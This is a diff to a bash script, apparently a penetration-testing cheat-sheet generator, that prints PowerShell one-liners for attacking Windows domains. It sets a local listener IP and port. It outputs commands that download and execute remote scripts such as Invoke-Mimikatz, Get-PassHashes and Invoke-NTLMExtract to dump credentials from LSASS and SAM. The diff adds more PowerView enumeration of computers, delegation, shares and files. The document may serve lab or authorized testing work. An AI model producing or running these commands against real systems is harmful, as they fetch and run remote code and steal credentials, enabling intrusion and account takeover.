@@ -8,7 +8,7 @@ set -o pipefail
 # Variables                                                                    #
 ################################################################################
 
-LocalIP="10.10.14.10";		#
+LocalIP="10.10.14.2";		#
 LocalPort="8080";		#
 
 Username="";			#
@@ -710,7 +710,7 @@ echo -e "${IBLUE}LSASS Memory${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -DumpCreds"
 echo -e ""
 echo -e "${IBLUE}SAM${RESTORE}"
-echo -e "$DownloadMethod '$NishangRepo""Gather/Get-PassHashes.ps1');Get-PassHashes"
+echo -e "$DownloadMethod "$NishangRepo"Gather/Get-PassHashes.ps1);Get-PassHashes"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-NTLMExtract.ps1);Invoke-NTLMExtract"
 echo -e ""
 echo -e "${IBLUE}NTDS${RESTORE}"
@@ -826,8 +826,14 @@ echo -e "${LRED}┌────────────────────�
 echo -e ""
 # Powerview
 echo -e "${LGREEN}Computer Enumeration${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}All Computers${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Properties Name,OperatingSystem,distinguishedname "
+echo -e ""
+echo -e "${IBLUE}Ping Alive Computers${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Ping"
+echo -e ""
+echo -e "${IBLUE}Computers by Operating System${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 10 Pro'"
 echo -e ""
 echo -e "${LGREEN}User Enumeration${RESTORE}"
@@ -851,7 +857,15 @@ echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComput
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -TrustedToAuth"
 echo -e ""
 echo -e "${IBLUE}Delegation (Unconstrained)${RESTORE}"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -Unconstrained | select -ExpandProperty name"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Unconstrained | select -ExpandProperty name"
+echo -e ""
+echo -e "${LGREEN}Other Enumeration${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Share Enumeration${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ShareFinder -verbose"
+echo -e ""
+echo -e "${IBLUE}File Enumeration${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -verbose"
 echo -e ""
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 echo -e "${LRED}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
